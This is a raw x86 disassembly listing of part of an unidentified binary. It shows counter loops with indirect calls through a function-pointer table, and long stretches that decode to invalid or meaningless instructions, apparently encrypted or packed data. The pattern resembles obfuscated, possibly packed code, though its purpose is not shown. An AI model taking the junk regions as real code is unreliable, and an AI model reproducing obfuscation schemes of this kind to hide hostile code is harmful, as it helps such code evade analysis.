  40a21a:	pop    es
  40a21b:	scas   eax,DWORD PTR es:[edi]
  40a21c:	or     eax,0x3167250c
  40a221:	ss (bad) 
  40a224:	xchg   ecx,eax
  40a225:	mov    cl,0x94
  40a227:	test   DWORD PTR [edi+0x12835dbf],ecx
  40a22d:	scas   al,BYTE PTR es:[edi]
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	ror    DWORD PTR [esp+eax*4],1
  40a2c7:	retf   
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a28f
  40a2d1:	leave  
  40a2d2:	mov    es,WORD PTR [ebp+0x25fd2657]
  40a2d8:	inc    ebp
  40a2d9:	mov    esp,0x43e0076e
  40a2de:	out    dx,eax
  40a2df:	lock pop es
  40a2e1:	or     edx,ebx
  40a2e3:	fnstcw WORD PTR [ecx-0x64bdb3b9]
  40a2e9:	loopne 0x40a309
  40a2eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2ec:	inc    esi
  40a2ed:	fiadd  DWORD PTR [ebp+0x2e7c45bf]
  40a2f3:	je     0x40a285
  40a2f5:	mov    bh,al
  40a2f7:	sub    ah,BYTE PTR [eax-0x41a0c77f]
  40a2fd:	lds    ebx,FWORD PTR [esi-0x1e]
  40a300:	outs   dx,DWORD PTR ds:[esi]
  40a301:	dec    edi
  40a302:	icebp  
  40a303:	std    
  40a304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a305:	rol    BYTE PTR [edx+0x36],cl
  40a308:	imul   ebp,DWORD PTR [eax+0x229716f],0xec06198d
  40a312:	outs   dx,BYTE PTR ds:[esi]
  40a313:	jne    0x40a33e
  40a315:	iret   
  40a316:	add    ch,BYTE PTR [ecx]
  40a318:	adc    al,BYTE PTR [edx-0x451e410f]
  40a31e:	xchg   edi,eax
  40a31f:	inc    edx
  40a320:	jo     0x40a2de
  40a322:	test   DWORD PTR [ebp-0x4f],0xaeadc9c9
  40a329:	ins    DWORD PTR es:[edi],dx
  40a32a:	stos   BYTE PTR es:[edi],al
  40a32b:	mov    edi,0x742eb84a
  40a330:	push   edx
  40a331:	sub    esp,DWORD PTR [ebx-0x5370e8ef]
  40a337:	push   ebp
  40a338:	fwait
  40a339:	jno    0x40a310
  40a33b:	mov    dh,0xa8
  40a33d:	xchg   ebp,eax
  40a33e:	xor    eax,0x8b166eff
  40a343:	add    al,0x8b
  40a345:	sub    DWORD PTR [edx],0xceb1a8a4
  40a34b:	jno    0x40a317
  40a34d:	or     DWORD PTR [esi-0x31],0xbe88531e
  40a354:	mov    BYTE PTR [edx-0x6dbb9d94],0x91
  40a35b:	mov    edi,0x2d6e1699
  40a360:	pop    ax
  40a362:	fdiv   DWORD PTR [ecx]
  40a364:	sbb    eax,DWORD PTR [ebx-0x71fbf1bc]
  40a36a:	retf   0x6f62
  40a36d:	ret    0x59d2
  40a370:	shl    BYTE PTR [edi],cl
  40a372:	pop    esp
  40a373:	push   ss
  40a374:	jb     0x40a3e3
  40a376:	pop    ecx
  40a377:	arpl   WORD PTR [edx],cx
  40a379:	mov    ch,0x73
  40a37b:	jnp    0x40a3e8
  40a37d:	mov    dl,0x1f
  40a37f:	sbb    al,0x82
  40a381:	inc    esp
  40a382:	dec    edx
  40a383:	jbe    0x40a3d4
  40a385:	(bad)  
  40a386:	repnz xlat BYTE PTR ds:[ebx]
  40a388:	jae    0x40a38f
  40a38a:	(bad)  
  40a38b:	call   0x7e28aa3d
  40a390:	fisub  WORD PTR [eax-0x29]
  40a393:	push   ds
  40a394:	int    0xbd
  40a396:	in     eax,0x2f
  40a398:	mov    ds:0xbdd2c063,al
  40a39d:	(bad)  
  40a39e:	jno    0x40a359
  40a3a0:	mov    esi,eax
  40a3a2:	pop    ebp
  40a3a3:	xchg   ebp,eax
  40a3a4:	int    0x83
  40a3a6:	out    dx,eax
  40a3a7:	retf   0xeddf
  40a3aa:	add    esi,DWORD PTR [eax+0x75]
  40a3ad:	inc    edx
  40a3ae:	inc    eax
  40a3af:	adc    BYTE PTR [edx+ecx*4+0x423a9d0],0x60
  40a3b7:	in     al,dx
  40a3b8:	xchg   edi,ecx
  40a3ba:	sbb    BYTE PTR [ebx-0x66],dh
  40a3bd:	mov    ebx,0xfe905d63
  40a3c2:	(bad)  
  40a3c4:	jmp    DWORD PTR [esi]
  40a3c6:	pop    edx
  40a3c7:	push   ds
  40a3c8:	sbb    eax,0x8aab4e66
  40a3cd:	adc    dl,cl
  40a3cf:	add    eax,0x74eafa17
  40a3d4:	in     al,dx
  40a3d5:	jnp    0x40a435
  40a3d7:	outs   dx,DWORD PTR ds:[esi]
  40a3d8:	shl    DWORD PTR [eax+0x1d2cf243],1
  40a3de:	(bad)  
  40a3e0:	test   cl,al
  40a3e2:	mov    ebp,0xd41285dd
  40a3e7:	je     0x40a369
  40a3e9:	cmp    BYTE PTR [eax-0xb5c3ffd],0x97
  40a3f0:	(bad)  
  40a3f1:	or     eax,0x5518a157
  40a3f6:	adc    BYTE PTR [ebp-0x1],bl
  40a3f9:	pop    ebp
  40a3fa:	jne    0x40a43c
  40a3fc:	jno    0x40a3ff
  40a3fe:	stos   DWORD PTR es:[edi],eax
  40a3ff:	or     ebx,eax
  40a401:	mov    bl,ch
  40a403:	(bad)  
  40a404:	jg     0x40a3f9
  40a406:	ja     0x40a3ae
  40a408:	or     al,BYTE PTR [ecx+0x4a]
  40a40b:	sti    
  40a40c:	jbe    0x40a45a
  40a40e:	jo     0x40a44a
  40a410:	iret   
  40a411:	sar    DWORD PTR ds:0xffc60036,1
  40a417:	popa   
  40a418:	inc    edi
  40a419:	std    
  40a41a:	repz ficomp DWORD PTR [eax]
  40a41d:	add    ah,BYTE PTR [ebx+0x73dfca86]
  40a423:	int    0x2f
  40a425:	scas   al,BYTE PTR es:[edi]
  40a426:	jmp    0x40a441
  40a428:	jecxz  0x40a3f5
  40a42a:	bound  ecx,QWORD PTR [ebx+eiz*2]
  40a42d:	sub    BYTE PTR [ebx-0x22d6e1fb],bl
  40a433:	xchg   edi,eax
  40a434:	mov    ds:0xd97820af,eax
  40a439:	das    
  40a43a:	imul   ecx,DWORD PTR [esi+0x6fd2fb45],0xffffffa8
  40a441:	adc    DWORD PTR [esi-0x7de7cc5c],edi
  40a447:	jae    0x40a480
  40a449:	mov    BYTE PTR [edi+0x5a50ffe5],dh
  40a44f:	scas   eax,DWORD PTR es:[edi]
  40a450:	inc    DWORD PTR cs:[ebx+0x66]
  40a454:	nop
  40a455:	inc    eax
  40a456:	rol    BYTE PTR [esi+0x3c],cl
  40a459:	loop   0x40a48c
  40a45b:	in     eax,0x84
  40a45d:	sbb    esi,esp
  40a45f:	jmp    0x40a453
  40a461:	add    ebx,DWORD PTR [edx]
  40a463:	lea    ebx,ds:0x612b57d0
  40a469:	fwait
  40a46a:	or     ebx,DWORD PTR [edi]
  40a46c:	jmp    0x40a42d
  40a46e:	xor    eax,0xcb4b2ff4
  40a473:	mov    ds:0x35bef6d2,al
  40a478:	xor    BYTE PTR [edx-0x79],ah
  40a47b:	mov    al,0x43
  40a47d:	xchg   ecx,eax
  40a47e:	popaw  
  40a480:	not    DWORD PTR [ecx-0x7a]
  40a483:	ss adc eax,0xc2e1d321
  40a489:	inc    edx
  40a48a:	push   ebx
  40a48b:	and    eax,0x6856fd1d
  40a490:	xor    al,0x6
  40a492:	mov    bl,0xaf
  40a494:	stos   DWORD PTR es:[edi],eax
  40a495:	mov    ebx,0xfe718dce
  40a49a:	daa    
  40a49b:	xchg   ebx,eax
  40a49c:	cmp    ebx,DWORD PTR [ecx]
  40a49e:	jle    0x40a4a4
  40a4a0:	out    0xb1,eax
  40a4a2:	mov    al,ds:0x3f3723ff
  40a4a7:	mov    ds,WORD PTR [bx+di-0x49]
  40a4ab:	scas   eax,DWORD PTR es:[edi]
  40a4ac:	imul   ecx,DWORD PTR [edi],0x17
  40a4af:	std    
  40a4b0:	cs dec ecx
  40a4b2:	mov    WORD PTR [eax],ds
  40a4b4:	(bad)  [ebp+0x1eaedc44]
  40a4ba:	pop    ds
  40a4bb:	inc    ebx
  40a4bc:	xor    BYTE PTR [ecx],bh
  40a4be:	add    ebp,esp
  40a4c0:	mov    esp,0x4201a9dc
  40a4c5:	xor    edx,esp
  40a4c7:	sahf   
  40a4c8:	jg     0x40a52e
  40a4ca:	dec    eax
  40a4cb:	shr    BYTE PTR [ecx+eax*4-0x6bffb18b],0xad
  40a4d3:	iret   
  40a4d4:	aad    0xfa
  40a4d6:	sbb    BYTE PTR [eax],bl
  40a4d8:	push   ecx
  40a4d9:	cwde   
  40a4da:	add    ebx,edi
  40a4dc:	or     ch,bl
  40a4de:	stos   BYTE PTR es:[edi],al
  40a4df:	stos   BYTE PTR es:[edi],al
  40a4e0:	div    BYTE PTR [ebx-0x65]
  40a4e3:	pop    edi
  40a4e4:	retf   
  40a4e5:	sti    
  40a4e6:	mov    al,ds:0x9e123be6
  40a4eb:	and    eax,0x92b1ce7c
  40a4f0:	add    ah,BYTE PTR [edx+edx*8-0x6b]
  40a4f4:	push   0xffffffd3
  40a4f6:	out    0x20,al
  40a4f8:	mov    ah,0xb6
  40a4fa:	jno    0x40a4ad
  40a4fc:	outs   dx,DWORD PTR ds:[esi]
  40a4fd:	add    BYTE PTR [edx+0x72c2dd99],cl
  40a503:	push   0x635aea6a
  40a508:	push   ds
  40a509:	inc    esp
  40a50a:	fmul   QWORD PTR ds:0x39e5df12
  40a510:	repz xor ebp,DWORD PTR [eax+ebx*8]
  40a514:	inc    esi
  40a515:	je     0x40a4f2
  40a517:	dec    ecx
  40a518:	xchg   esi,eax
  40a519:	push   ebx
  40a51a:	jle    0x40a568
  40a51c:	arpl   WORD PTR [ebx-0x5b],di
  40a51f:	or     ch,BYTE PTR [esi]
  40a521:	(bad)  
  40a522:	div    DWORD PTR [ebp+0x49f961be]
  40a528:	lea    esi,[esi]
  40a52a:	test   al,0x32
  40a52c:	dec    edx
  40a52d:	jo     0x40a4f0
  40a52f:	pop    esp
  40a530:	stc    
  40a531:	jns    0x40a587
  40a533:	mov    ds:0x54300326,al
  40a538:	call   0xdacaae5b
  40a53d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a53e:	ror    BYTE PTR [esi],1
  40a540:	fdiv   DWORD PTR [ebx+0x6a]
  40a543:	loopne 0x40a4ca
  40a545:	or     bl,bh
  40a547:	jne    0x40a4f9
  40a549:	cmp    edx,esi
  40a54b:	scas   eax,DWORD PTR es:[edi]
  40a54c:	mov    ds,WORD PTR [ebp+ecx*4-0x77320b05]
  40a553:	scas   eax,DWORD PTR es:[edi]
  40a554:	sub    al,0xe5
  40a556:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a557:	sub    ch,BYTE PTR [eax+eax*4-0x6e9ab67c]
  40a55e:	nop
  40a55f:	jl     0x40a56a
  40a561:	cmp    ebp,ecx
  40a563:	cmp    esp,esp
  40a565:	lea    esp,[eax]
  40a567:	inc    ebp
  40a568:	inc    ebx
  40a569:	retf   0x3990
  40a56c:	fistp  QWORD PTR [ecx+0x672d0d65]
  40a572:	push   edi
  40a573:	mov    al,0x28
  40a575:	ins    DWORD PTR es:[edi],dx
  40a576:	mov    esp,0xced272be
  40a57b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a57c:	inc    esi
  40a57d:	mov    ds:0xc6d8f63b,eax
  40a582:	leave  
  40a583:	(bad)  
  40a585:	cmp    esi,eax
  40a587:	fs ss cwde 
  40a58a:	sub    DWORD PTR [edx+0x326e3ed7],ebp
  40a590:	adc    al,0xb
  40a592:	mov    cl,0xcb
  40a594:	mov    al,cl
  40a596:	mov    ds,WORD PTR [esi-0x614316]
  40a59c:	add    ch,ah
  40a59e:	cmp    DWORD PTR [esp+ecx*2+0x7c],eax
  40a5a2:	jne    0x40a5c8
  40a5a4:	push   ss
  40a5a5:	mov    eax,0xd614e134
  40a5aa:	and    dh,BYTE PTR [edi]
  40a5ac:	jmp    0xc780:0x8ddcd36e
  40a5b3:	loopne 0x40a548
  40a5b5:	jne    0x40a5e7
  40a5b7:	and    al,0x15
  40a5b9:	cmp    dl,BYTE PTR [ecx+0x172ef8ae]
  40a5bf:	aam    0xf9
  40a5c1:	cmp    al,0x89
  40a5c3:	add    eax,0xce808796
  40a5c8:	and    DWORD PTR [esi],esp
  40a5ca:	push   esi
  40a5cb:	mov    bh,0xb9
  40a5cd:	ins    BYTE PTR es:[edi],dx
  40a5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5cf:	xchg   edx,eax
  40a5d0:	xor    al,0xe6
  40a5d2:	adc    bl,BYTE PTR [edi+0x5e523969]
  40a5d8:	es inc ebx
  40a5da:	xchg   esi,eax
  40a5db:	mov    edi,0x45a1afa5
  40a5e0:	adc    BYTE PTR [edx+edi*4],bl
  40a5e3:	cdq    
  40a5e4:	(bad)  
  40a5e5:	mov    al,0x43
  40a5e7:	jmp    0x40a61e
  40a5e9:	(bad)  
  40a5ea:	inc    DWORD PTR [esi+0x731f2bb0]
  40a5f0:	jns    0x40a5e4
  40a5f2:	push   ds
  40a5f3:	int    0xb5
  40a5f5:	clc    
  40a5f6:	(bad)  
  40a5f7:	mov    ch,0xfd
  40a5f9:	std    
  40a5fa:	dec    ebx
  40a5fb:	not    BYTE PTR [esi+0x3c]
  40a5fe:	sbb    ah,dh
  40a600:	cmp    DWORD PTR [edi+eax*4-0x322755a0],0x94ca46bb
  40a60b:	outs   dx,BYTE PTR ds:[esi]
  40a60c:	inc    edx
  40a60d:	push   esi
  40a60e:	pushf  
  40a60f:	sub    edi,ecx
  40a611:	stc    
  40a612:	lea    edi,[ebx+0x7d012b22]
  40a618:	cmp    bl,BYTE PTR [eax-0x2]
  40a61b:	jno    0x40a5e4
  40a61d:	fsub   QWORD PTR [esi]
  40a61f:	or     DWORD PTR [edi],esp
  40a621:	push   esi
  40a622:	xor    eax,0xc7dce11a
  40a627:	sbb    eax,0x562b73
  40a62c:	rcl    DWORD PTR [esp+eiz*8],0x9f
  40a630:	aad    0xe7
  40a632:	scas   al,BYTE PTR es:[edi]
  40a633:	sub    esi,ebp
  40a635:	(bad)  
  40a636:	into   
  40a637:	jo     0x40a636
  40a639:	pop    eax
  40a63a:	cmp    BYTE PTR [ecx+0x49],al
  40a63d:	jg     0x40a69a
  40a63f:	lds    edi,FWORD PTR [edx+0x29]
  40a642:	mov    ds,ebx
  40a644:	in     eax,dx
  40a645:	scas   al,BYTE PTR es:[edi]
  40a646:	ret    
  40a647:	dec    ebx
  40a648:	bound  esp,QWORD PTR [edx]
  40a64a:	fsub   DWORD PTR [ecx]
  40a64c:	mov    ch,0x3a
  40a64e:	lahf   
  40a64f:	fnsave [ebp-0x36]
  40a652:	pusha  
  40a653:	sbb    DWORD PTR [eax],ebx
  40a655:	push   ecx
  40a656:	loop   0x40a67c
  40a658:	xchg   esi,eax
  40a659:	fxch   st(7)
  40a65b:	push   esp
  40a65c:	in     eax,0x66
  40a65e:	sbb    BYTE PTR [ebx+0x49613507],dl
  40a664:	add    ah,bl
  40a666:	xor    al,0x85
  40a668:	in     al,dx
  40a669:	mov    dl,BYTE PTR [ebx]
  40a66b:	(bad)  
  40a66c:	lds    esp,FWORD PTR [ecx-0xe]
  40a66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a670:	aam    0xc7
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	xor    edi,esi
  40a855:	rol    BYTE PTR [eax+0x7070f1e4],1
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7f5
  40a860:	cs cld 
  40a862:	clc    
  40a863:	arpl   WORD PTR [edi],bx
  40a865:	pop    edi
  40a866:	fsub   DWORD PTR [eax]
  40a868:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40a86a:	cmp    DWORD PTR [edi],eax
  40a86c:	mov    ds:0x6f30f851,eax
  40a871:	mov    cl,0xcd
  40a873:	scas   al,BYTE PTR es:[edi]
  40a874:	into   
  40a875:	call   0xbb52:0x606635d9
  40a87c:	mov    cl,0x6
  40a87e:	pop    esp
  40a87f:	ficom  WORD PTR [ebx-0x42faa35a]
  40a885:	push   cs
  40a886:	mov    al,ds:0xdf9a6607
  40a88b:	add    ebx,DWORD PTR [ecx-0x77]
  40a88e:	fmul   st(6),st
  40a890:	sub    BYTE PTR [edi+0xa],al
  40a893:	mov    esi,0x30399882
  40a898:	das    
  40a899:	ds (bad) 
  40a89b:	call   0x37a9a2ba
  40a8a0:	dec    eax
  40a8a1:	cmp    DWORD PTR [ebx-0x618c35cb],esp
  40a8a7:	hlt    
  40a8a8:	and    cl,dh
  40a8aa:	inc    ebp
  40a8ab:	out    0xf7,al
  40a8ad:	cs mov ebx,0x404a6765
  40a8b3:	and    eax,0xae85a123
  40a8b8:	push   0x65
  40a8ba:	repnz rol DWORD PTR [ecx+0x69bf561b],0x6d
  40a8c2:	xor    BYTE PTR [ebp-0x52f403d1],0xee
  40a8c9:	popa   
  40a8ca:	(bad)  
  40a8cb:	into   
  40a8cc:	int3   
  40a8cd:	outs   dx,DWORD PTR ds:[esi]
  40a8ce:	retf   
  40a8cf:	jge    0x40a931
  40a8d1:	not    DWORD PTR [esi+0x31]
  40a8d4:	lea    esp,[ecx]
  40a8d6:	mov    ecx,0x49a8b86a
  40a8db:	stos   BYTE PTR es:[edi],al
  40a8dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a8dd:	into   
  40a8de:	fsubp  st(4),st
  40a8e0:	stc    
  40a8e1:	cwde   
  40a8e2:	mov    ecx,0x439ecd56
  40a8e7:	jle    0x40a95f
  40a8e9:	xlat   BYTE PTR ds:[ebx]
  40a8ea:	cli    
  40a8eb:	xchg   ebp,eax
  40a8ec:	icebp  
  40a8ed:	(bad)  
  40a8ee:	xchg   DWORD PTR es:[esi+0x23],esp
  40a8f2:	in     eax,0x94
  40a8f4:	arpl   WORD PTR [edi-0x2a946c19],di
  40a8fa:	pop    esp
  40a8fb:	(bad)  
  40a8fc:	stc    
  40a8fd:	ror    bl,1
  40a8ff:	ror    DWORD PTR [eax+edi*8-0x6d8e8e19],0xa1
  40a907:	retf   0x804f
  40a90a:	rcr    BYTE PTR [eax-0x77],cl
  40a90d:	inc    DWORD PTR [eax+0x9]
  40a910:	push   edi
  40a911:	aas    
  40a912:	(bad)  
  40a915:	push   ss
  40a916:	inc    eax
  40a917:	retf   
  40a918:	lods   al,BYTE PTR ds:[esi]
  40a919:	mov    BYTE PTR [ecx+0x42367a6a],dl
  40a91f:	and    DWORD PTR [edi+0x55],esp
  40a922:	neg    DWORD PTR [esi]
  40a924:	sbb    eax,0xc852f83b
  40a929:	xor    dh,cl
  40a92b:	adc    ebp,DWORD PTR [edx]
  40a92d:	aas    
  40a92e:	mov    dl,0xcf
  40a930:	mov    eax,0xeb95b831
  40a935:	enter  0xcc88,0xd9
  40a939:	cld    
  40a93a:	pushf  
  40a93b:	dec    ebx
  40a93c:	ins    BYTE PTR es:[edi],dx
  40a93d:	retf   0x4ffc
  40a940:	adc    eax,0x4b287c16
  40a945:	push   esi
  40a946:	cmp    DWORD PTR [ebp-0x63],ebx
  40a949:	push   esi
  40a94a:	dec    ebx
  40a94b:	pop    ebp
  40a94c:	inc    ebp
  40a94d:	fs cli 
  40a94f:	dec    edx
  40a950:	retf   0xee92
  40a953:	add    edx,0x8766866f
  40a959:	call   0xfde5:0x8678a01d
  40a960:	jnp    0x40a97b
  40a962:	inc    ebx
  40a963:	cli    
  40a964:	scas   al,BYTE PTR es:[edi]
  40a965:	or     BYTE PTR [ecx],0xe7
  40a968:	dec    esp
  40a969:	test   eax,0x7c64ee9d
  40a96e:	mov    gs,WORD PTR [edx+0x5e]
  40a971:	dec    ebx
  40a972:	ja     0x40a912
  40a974:	cmc    
  40a975:	leave  
  40a976:	sbb    DWORD PTR [ebx+0x1ade1b9f],edx
  40a97c:	mov    ds:0x7a65fc1,al
  40a981:	lahf   
  40a982:	jbe    0x40a918
  40a984:	jmp    0x40a942
  40a986:	jno    0x40a9ad
  40a988:	mov    edx,0x3718ca83
  40a98d:	xlat   BYTE PTR ds:[ebx]
  40a98e:	mov    ebp,fs
  40a990:	enter  0xfeae,0x1e
  40a994:	or     bh,0x16
  40a997:	retf   0xd468
  40a99a:	popa   
  40a99b:	add    ch,bl
  40a99d:	rol    DWORD PTR [eax],0xec
  40a9a0:	jbe    0x40a9c2
  40a9a2:	mov    eax,ds:0x7f4cfd8d
  40a9a7:	sbb    DWORD PTR [edx-0xeb58420],esp
  40a9ad:	out    0xc1,al
  40a9af:	sub    dl,ah
  40a9b1:	xchg   ebx,eax
  40a9b2:	mov    ch,0xbc
  40a9b4:	push   ebx
  40a9b5:	or     dh,0xc3
  40a9b8:	inc    esp
  40a9b9:	xchg   ecx,eax
  40a9ba:	mov    al,0x7c
  40a9bc:	or     ch,BYTE PTR [edx]
  40a9be:	(bad)  
  40a9bf:	or     eax,0x1309823f
  40a9c4:	fsubr  QWORD PTR [esi+ebx*1]
  40a9c7:	lods   eax,DWORD PTR ds:[esi]
  40a9c8:	les    esi,FWORD PTR [ecx+0x3d]
  40a9cb:	xlat   BYTE PTR ds:[ebx]
  40a9cc:	lahf   
  40a9cd:	ss sub ebx,eax
  40a9d0:	jp     0x40aa19
  40a9d2:	in     al,dx
  40a9d3:	xor    esp,DWORD PTR [esi-0x6e]
  40a9d6:	mov    edi,0xbd6942f
  40a9db:	xchg   edx,eax
  40a9dc:	sub    DWORD PTR [ecx-0x4c258166],ebx
  40a9e2:	test   cl,dh
  40a9e4:	imul   ecx,DWORD PTR [ebp-0x50173d80],0x1d
  40a9eb:	das    
  40a9ec:	outs   dx,DWORD PTR ds:[esi]
  40a9ed:	stc    
  40a9ee:	mov    ecx,0xfb2b452b
  40a9f3:	or     eax,0x29fc73e2
  40a9f8:	dec    esi
  40a9f9:	retf   
  40a9fa:	xchg   edi,eax
  40a9fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9fc:	mov    esp,0xa49c475f
  40aa01:	xor    DWORD PTR [edx+edx*2+0x5d],ecx
  40aa05:	(bad)  
  40aa06:	sti    
  40aa07:	ds jmp 0x40aa71
  40aa0a:	push   ss
  40aa0b:	shr    DWORD PTR [edx-0x66],cl
  40aa0e:	push   ds
  40aa0f:	enter  0xca2,0xfa
  40aa13:	mov    esp,0x19da29da
  40aa18:	mov    edx,0x59fae85a
  40aa1d:	lods   eax,DWORD PTR ds:[esi]
  40aa1e:	fsubr  st(1),st
  40aa20:	pop    esi
  40aa21:	add    al,0x46
  40aa23:	xor    bl,dl
  40aa25:	mov    eax,ds:0xffda5706
  40aa2a:	sar    BYTE PTR [edi],1
  40aa2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa2d:	aam    0x26
  40aa2f:	xchg   edi,ebp
  40aa31:	fist   DWORD PTR [esi]
  40aa33:	pop    ds
  40aa34:	mov    cl,0xf3
  40aa36:	inc    edi
  40aa37:	adc    ch,BYTE PTR [edi]
  40aa39:	cmc    
  40aa3a:	sub    al,0x23
  40aa3c:	mul    edx
  40aa3e:	xor    al,0x34
  40aa40:	int3   
  40aa41:	vdivps xmm6,xmm6,xmm3
  40aa45:	jo     0x40a9d4
  40aa47:	(bad)  
  40aa48:	mov    ch,0xf1
  40aa4a:	ins    BYTE PTR es:[edi],dx
  40aa4b:	shl    dl,1
  40aa4d:	hlt    
  40aa4e:	mov    eax,0x4a8f3d06
  40aa53:	jl     0x40aa39
  40aa55:	jnp    0x40aa9d
  40aa57:	outs   dx,BYTE PTR ds:[esi]
  40aa58:	aas    
  40aa59:	iret   
  40aa5a:	push   edx
  40aa5b:	mov    esp,0xee8566e1
